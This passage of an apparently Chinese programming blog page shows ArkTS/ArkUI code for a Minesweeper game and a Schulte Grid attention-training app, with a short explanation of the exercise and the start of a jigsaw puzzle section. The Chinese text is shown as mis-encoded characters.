language_">this</span>.<span class="title function_">initializeGame</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// åˆ¤æ–­æ¸¸æˆæ˜¯å¦èƒœåˆ©</span></span><br><span class="line">  private <span class="title function_">isVictory</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> revealedNonMineCount = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">this</span>.<span class="property">gameBoard</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="variable language_">this</span>.<span class="property">gameBoard</span>[i].<span class="property">length</span>; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">revealedCells</span>.<span class="title function_">has</span>(<span class="string">`<span class="subst">$&#123;i&#125;</span>,<span class="subst">$&#123;j&#125;</span>`</span>)) &#123;</span><br><span class="line">          revealedNonMineCount++;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> revealedNonMineCount == <span class="number">90</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// å†³å®šæ˜¯å¦æ˜¾ç¤ºæ–¹å—å€¼</span></span><br><span class="line">  private <span class="title function_">isShowValue</span>(<span class="attr">cell</span>: <span class="title class_">Cell</span>): string &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">isGameOver</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> cell.<span class="property">value</span> === <span class="string">&#x27;0&#x27;</span> ? <span class="string">&#x27;&#x27;</span> : cell.<span class="property">value</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">revealedCells</span>.<span class="title function_">has</span>(<span class="string">`<span class="subst">$&#123;cell.row&#125;</span>,<span class="subst">$&#123;cell.column&#125;</span>`</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> cell.<span class="property">value</span> === <span class="string">&#x27;0&#x27;</span> ? <span class="string">&#x27;&#x27;</span> : cell.<span class="property">value</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>(&#123; <span class="attr">space</span>: <span class="number">10</span> &#125;) &#123;</span><br><span class="line">      <span class="comment">// é‡ç½®æ¸¸æˆæŒ‰é’®</span></span><br><span class="line">      <span class="title class_">Button</span>(<span class="string">&#x27;é‡æ–°å¼€å§‹&#x27;</span>).<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> <span class="variable language_">this</span>.<span class="title function_">initializeGame</span>());</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// åˆ›å»ºæ¸¸æˆé¢æ¿å®¹å™¨</span></span><br><span class="line">      <span class="title class_">Flex</span>(&#123; <span class="attr">wrap</span>: <span class="title class_">FlexWrap</span>.<span class="property">Wrap</span> &#125;) &#123;</span><br><span class="line">        <span class="comment">// éå†æ¯ä¸€è¡Œ</span></span><br><span class="line">        <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">gameBoard</span>, <span class="function">(<span class="params">row: Cell[], rowIndex: number</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="comment">// éå†æ¯ä¸€åˆ—</span></span><br><span class="line">          <span class="title class_">ForEach</span>(row, <span class="function">(<span class="params">cell: Cell, colIndex: number</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="title class_">Stack</span>() &#123;</span><br><span class="line">              <span class="comment">// æ˜¾ç¤ºæ–¹å—ä¸Šçš„æ•°å­—æˆ–é›·</span></span><br><span class="line">              <span class="title class_">Text</span>(<span class="variable language_">this</span>.<span class="title function_">isShowValue</span>(cell))</span><br><span class="line">                .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>lpx`</span>)</span><br><span class="line">                .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>lpx`</span>)</span><br><span class="line">                .<span class="title function_">margin</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellMargin&#125;</span>lpx`</span>)</span><br><span class="line">                .<span class="title function_">fontSize</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize / <span class="number">2</span>&#125;</span>lpx`</span>)</span><br><span class="line">                .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)</span><br><span class="line">                .<span class="title function_">backgroundColor</span>(<span class="variable language_">this</span>.<span class="property">revealedCells</span>.<span class="title function_">has</span>(<span class="string">`<span class="subst">$&#123;rowIndex&#125;</span>,<span class="subst">$&#123;colIndex&#125;</span>`</span>) ?</span><br><span class="line">                  (<span class="variable language_">this</span>.<span class="title function_">isShowValue</span>(cell) === <span class="string">&#x27;é›·&#x27;</span> ? <span class="title class_">Color</span>.<span class="property">Red</span> : <span class="title class_">Color</span>.<span class="property">White</span>) : <span class="title class_">Color</span>.<span class="property">Gray</span>)</span><br><span class="line">                .<span class="title function_">fontColor</span>(!<span class="variable language_">this</span>.<span class="property">revealedCells</span>.<span class="title function_">has</span>(<span class="string">`<span class="subst">$&#123;rowIndex&#125;</span>,<span class="subst">$&#123;colIndex&#125;</span>`</span>) || <span class="variable language_">this</span>.<span class="title function_">isShowValue</span>(cell) === <span class="string">&#x27;é›·&#x27;</span> ?</span><br><span class="line">                <span class="title class_">Color</span>.<span class="property">White</span> : <span class="title class_">Color</span>.<span class="property">Black</span>)</span><br><span class="line">                .<span class="title function_">borderRadius</span>(<span class="number">5</span>)</span><br><span class="line">                .<span class="title function_">parallelGesture</span>(<span class="title class_">GestureGroup</span>(<span class="title class_">GestureMode</span>.<span class="property">Exclusive</span>,</span><br><span class="line">                  <span class="title class_">TapGesture</span>(&#123; <span class="attr">count</span>: <span class="number">1</span>, <span class="attr">fingers</span>: <span class="number">1</span> &#125;)</span><br><span class="line">                    .<span class="title function_">onAction</span>(<span class="function">() =&gt;</span> <span class="variable language_">this</span>.<span class="title function_">revealCell</span>(rowIndex, colIndex)),</span><br><span class="line">                  <span class="title class_">LongPressGesture</span>(&#123; <span class="attr">repeat</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">                    .<span class="title function_">onAction</span>(<span class="function">() =&gt;</span> cell.<span class="property">isFlag</span> = <span class="literal">true</span>)</span><br><span class="line">                ));</span><br><span class="line"> </span><br><span class="line">              <span class="comment">// æ˜¾ç¤ºæ ‡è®°æ——å¸œ</span></span><br><span class="line">              <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;!<span class="variable language_">this</span>.revealedCells.has(<span class="string">`<span class="subst">$&#123;rowIndex&#125;</span>,<span class="subst">$&#123;colIndex&#125;</span>`</span>) ? <span class="string">&#x27;æ——&#x27;</span> : <span class="string">&#x27;&#x27;</span>&#125;</span>`</span>)</span><br><span class="line">                .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>lpx`</span>)</span><br><span class="line">                .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>lpx`</span>)</span><br><span class="line">                .<span class="title function_">margin</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellMargin&#125;</span>lpx`</span>)</span><br><span class="line">                .<span class="title function_">fontSize</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize / <span class="number">2</span>&#125;</span>lpx`</span>)</span><br><span class="line">                .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)</span><br><span class="line">                .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">                .<span class="title function_">visibility</span>(cell.<span class="property">isFlag</span> &amp;&amp; !<span class="variable language_">this</span>.<span class="property">isGameOver</span> ? <span class="title class_">Visibility</span>.<span class="property">Visible</span> : <span class="title class_">Visibility</span>.<span class="property">None</span>)</span><br><span class="line">                .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                  cell.<span class="property">isFlag</span> = <span class="literal">false</span>;</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">      .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;(<span class="variable language_">this</span>.cellSize + <span class="variable language_">this</span>.cellMargin * <span class="number">2</span>) * <span class="number">10</span>&#125;</span>lpx`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">Orange</span>)</span><br><span class="line">    .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">    .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// æ–¹å—ç±»</span></span><br><span class="line">@<span class="title class_">ObservedV2</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cell</span> &#123;</span><br><span class="line">  <span class="comment">// æ–¹å—æ‰€åœ¨çš„è¡Œ</span></span><br><span class="line">  <span class="attr">row</span>: number;</span><br><span class="line">  <span class="comment">// æ–¹å—æ‰€åœ¨çš„åˆ—</span></span><br><span class="line">  <span class="attr">column</span>: number;</span><br><span class="line">  <span class="comment">// æ˜¯å¦æœ‰åœ°é›·</span></span><br><span class="line">  <span class="attr">hasMine</span>: boolean = <span class="literal">false</span>;</span><br><span class="line">  <span class="comment">// å‘¨å›´åœ°é›·æ•°é‡</span></span><br><span class="line">  <span class="attr">neighborMines</span>: number = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// æ˜¯å¦è¢«æ ‡è®°ä¸ºåœ°é›·</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">isFlag</span>: boolean = <span class="literal">false</span>;</span><br><span class="line">  <span class="comment">// æ–¹å—å€¼</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">value</span>: string;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// æ„é€ å‡½æ•°</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">row: number, column: number</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">row</span> = row;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">column</span> = column;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">value</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Schrulte-Grid"><a href="#Schrulte-Grid" class="headerlink" title="Schrulte Grid"></a>Schrulte Grid</h1><p>èˆ’å°”ç‰¹æ–¹æ ¼ï¼ˆSchrulte Gridï¼‰ï¼Œä¹Ÿè¢«ç§°ä¸ºèˆ’å°”ç‰¹è¡¨æˆ–èˆ’å°”ç‰¹å›¾è¡¨ï¼Œæ˜¯ä¸€ç§ç”¨äºè®­ç»ƒæ³¨æ„åŠ›ã€è§†è§‰æœç´¢é€Ÿåº¦å’Œå¹¿åº¦çš„ç®€å•è€Œæœ‰æ•ˆçš„å·¥å…·ã€‚å®ƒé€šå¸¸ç”±ä¸€ä¸ª5x5çš„æ–¹æ ¼ç»„æˆï¼Œæ¯ä¸ªå°æ ¼å­é‡Œéšæœºå¡«å†™äº†1åˆ°25çš„æ•°å­—ã€‚è®­ç»ƒè€…éœ€è¦å°½å¿«åœ°æŒ‰ç…§æ•°å­—é¡ºåºæ‰¾å‡ºè¿™äº›æ•°å­—ï¼Œå¹¶ç”¨æ‰‹æŒ‡æŒ‡å‡ºæˆ–è¯´å‡ºå®ƒä»¬çš„ä½ç½®ã€‚</p><p>è¿™ç§ç»ƒä¹ å¯ä»¥å¸®åŠ©æé«˜çœ¼ç›çš„ç§»åŠ¨é€Ÿåº¦ã€æ‰©å¤§è§†é‡èŒƒå›´ã€å¢å¼ºå¤§è„‘çš„ååº”é€Ÿåº¦å’Œä¸“æ³¨åŠ›ï¼Œå› æ­¤å¸¸è¢«ç”¨æ¥ä½œä¸ºå„¿ç«¥å’Œæˆäººçš„æ³¨æ„åŠ›è®­ç»ƒæ–¹æ³•ä¹‹ä¸€ã€‚æ­¤å¤–ï¼Œå®ƒä¹Ÿè¢«ä¸€äº›ä¸“ä¸šé¢†åŸŸï¼ˆå¦‚é£è¡Œå‘˜ã€è¿åŠ¨å‘˜ç­‰ï¼‰ç”¨æ¥æå‡å¿«é€Ÿä¿¡æ¯å¤„ç†èƒ½åŠ›å’Œå†³ç­–æ•ˆç‡ã€‚</p><p>è¿›è¡Œèˆ’å°”ç‰¹æ–¹æ ¼è®­ç»ƒæ—¶ï¼Œå»ºè®®ï¼š</p><p>ä¿æŒæ­£ç¡®çš„å§¿åŠ¿ï¼Œç¡®ä¿å…‰çº¿å……è¶³ã€‚<br>çœ¼ç›ä¸çº¸é¢ä¿æŒé€‚å½“è·ç¦»ï¼Œä¸€èˆ¬ä¸º30-40å˜ç±³ã€‚<br>å°½é‡ä¸è¦ç”¨æ‰‹æŒ‡ç›´æ¥æŒ‡ç€æ•°å­—ï¼Œä»¥é”»ç‚¼çœ¼ç›çš„ç§»åŠ¨èƒ½åŠ›ã€‚<br>éšç€ç†Ÿç»ƒç¨‹åº¦çš„æé«˜ï¼Œå¯ä»¥å°è¯•æ›´å¤æ‚æˆ–æ›´å¤§çš„æ–¹æ ¼ï¼Œæ¯”å¦‚6x6æˆ–7x7ã€‚<br>å®šæœŸç»ƒä¹ ï¼Œä½†ä¹Ÿè¦æ³¨æ„ä¼‘æ¯ï¼Œé¿å…è¿‡åº¦ç–²åŠ³ã€‚<br>èˆ’å°”ç‰¹æ–¹æ ¼ä¸ä»…æ˜¯ä¸€ä¸ªç®€å•çš„æ¸¸æˆï¼Œä¹Ÿæ˜¯ä¸€ä¸ªå®ç”¨çš„è®¤çŸ¥è®­ç»ƒå·¥å…·ï¼Œå¯¹äºæ”¹å–„æ³¨æ„åŠ›é›†ä¸­åº¦å’Œä¸ªäººæ•ˆç‡æœ‰ç€ç§¯æçš„ä½œç”¨ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; promptAction &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.ArkUI&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">Index</span> &#123;</span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">numbers</span>: number[] = [];</span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">currentIndex</span>: number = <span class="number">0</span>; <span class="comment">//ç”¨äºåˆ¤æ–­ç”¨æˆ·ç‚¹å‡»æ˜¯å¦æ­£ç¡®</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">timeStart</span>: number = <span class="number">0</span>;</span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">widthItem</span>: number = <span class="number">120</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">marginItem</span>: number = <span class="number">5</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">// åˆå§‹åŒ–èˆ’å°”ç‰¹æ–¹æ ¼</span></span><br><span class="line">  <span class="title function_">initGrid</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">numbers</span> = []</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">25</span>; i++) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">numbers</span>.<span class="title function_">push</span>(i + <span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">shuffleArray</span>(<span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">this</span>.<span class="property">numbers</span>)));</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">currentIndex</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">timeStart</span> = <span class="title class_">Date</span>.<span class="title function_">now</span>()</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// éšæœºæ‰“ä¹±æ•°ç»„</span></span><br><span class="line">  <span class="title function_">shuffleArray</span>(<span class="params">array: number[]</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = array.<span class="property">length</span> - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">      <span class="keyword">const</span> j = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">25</span>);</span><br><span class="line">      <span class="keyword">let</span> temp = array[i]</span><br><span class="line">      array[i] = array[j]</span><br><span class="line">      array[j] = temp</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">numbers</span> = array</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// åˆ¤æ–­æ˜¯å¦å®Œæˆ</span></span><br><span class="line">  <span class="title function_">isCompleted</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">currentIndex</span> === <span class="number">25</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>(&#123; <span class="attr">space</span>: <span class="number">20</span> &#125;) &#123;</span><br><span class="line">      <span class="title class_">Flex</span>(&#123; <span class="attr">wrap</span>: <span class="title class_">FlexWrap</span>.<span class="property">Wrap</span> &#125;) &#123;</span><br><span class="line">        <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">numbers</span>, <span class="function">(<span class="params">item: number, index: number</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;item&#125;</span>`</span>)</span><br><span class="line">            .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.widthItem&#125;</span>lpx`</span>)</span><br><span class="line">            .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.widthItem&#125;</span>lpx`</span>)</span><br><span class="line">            .<span class="title function_">margin</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.marginItem&#125;</span>lpx`</span>)</span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.widthItem/<span class="number">2</span>&#125;</span>lpx`</span>)</span><br><span class="line">            .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)</span><br><span class="line">            .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">Orange</span>)</span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">            .<span class="title function_">borderRadius</span>(<span class="number">5</span>)</span><br><span class="line">            .<span class="title function_">visibility</span>(item &lt;= <span class="variable language_">this</span>.<span class="property">currentIndex</span> ? <span class="title class_">Visibility</span>.<span class="property">Hidden</span> : <span class="title class_">Visibility</span>.<span class="property">Visible</span>)</span><br><span class="line">            .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">              <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">numbers</span>[index] === <span class="variable language_">this</span>.<span class="property">currentIndex</span> + <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">currentIndex</span>++;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="title function_">isCompleted</span>()) &#123;</span><br><span class="line">                  <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&#x27;å®Œæˆï¼&#x27;</span>);</span><br><span class="line">                  promptAction.<span class="title function_">showDialog</span>(&#123;</span><br><span class="line">                    <span class="attr">title</span>: <span class="string">`ç”¨æ—¶`</span>,</span><br><span class="line">                    <span class="attr">message</span>: <span class="string">`<span class="subst">$&#123;((<span class="built_in">Date</span>.now() - <span class="variable language_">this</span>.timeStart) / <span class="number">1000</span>).toFixed(<span class="number">3</span>)&#125;</span>ç§’`</span>,</span><br><span class="line">                    <span class="attr">buttons</span>: [</span><br><span class="line">                      &#123;</span><br><span class="line">                        <span class="attr">text</span>: <span class="string">&#x27;é‡æ–°å¼€å§‹&#x27;</span>,</span><br><span class="line">                        <span class="attr">color</span>: <span class="string">&#x27;#ffa500&#x27;</span></span><br><span class="line">                      &#125;</span><br><span class="line">                    ],</span><br><span class="line">                  &#125;).<span class="title function_">then</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="title function_">initGrid</span>();</span><br><span class="line">                  &#125;)</span><br><span class="line">                &#125;</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&#x27;é”™è¯¯çš„é¡ºåºï¼&#x27;</span>);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">      .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;(<span class="variable language_">this</span>.widthItem + <span class="variable language_">this</span>.marginItem * <span class="number">2</span>) * <span class="number">5</span>&#125;</span>lpx`</span>)</span><br><span class="line">      .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;(<span class="variable language_">this</span>.widthItem + <span class="variable language_">this</span>.marginItem * <span class="number">2</span>) * <span class="number">5</span>&#125;</span>lpx`</span>)</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// å¼€å§‹æŒ‰é’®</span></span><br><span class="line">      <span class="title class_">Button</span>(<span class="string">&#x27;å¼€å§‹&#x27;</span>)</span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">&#x27;50%&#x27;</span>)</span><br><span class="line">        .<span class="title function_">height</span>(<span class="string">&#x27;10%&#x27;</span>)</span><br><span class="line">        .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="title function_">initGrid</span>();</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&#x27;æ¸¸æˆå¼€å§‹&#x27;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">    .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Piece"><a href="#Piece" class="headerlink" title="Piece"></a>Piece</h1><p>æ‹¼å›¾ </p><p>ç®—æ³•ï¼š éšæœº å‰ªè£ äº¤æ¢</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span 